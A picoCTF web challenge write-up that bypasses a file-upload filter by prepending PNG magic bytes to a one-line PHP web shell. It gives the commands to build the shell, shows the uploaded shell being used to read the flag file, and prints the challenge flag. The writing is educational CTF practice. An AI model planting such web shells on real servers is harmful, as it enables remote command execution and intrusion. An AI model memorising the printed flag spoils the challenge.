# Challenge URL
https://play.picoctf.org/practice/challenge/445
# Method of Solve
> There's an upload function on the landing page
> There's a robots.txt entry on the page that points us to instructions.txt and a directory: /uploads/
> When we read instructions.txt, we see that the app is looking for

* the .png extension in the submitted files
* magic bytes in the header

> We can prep our malicious file like so
```
echo '<?=`$_GET[0]`;?>' > webshell.php
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' | cat - webshell.php > webshell.png.php
sz webshell.png.php
```
> Upload the file from your downloads directory, and it should be accepted
> Now we can access the webshell from the /uploads directory
> When looking at the webroot directory, we see a file with an unusual name
```
http://atlas.picoctf.net:52396/uploads/webshell.png.php?0=cat%20../GNTDOMBWGIZDE.txt
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}
```
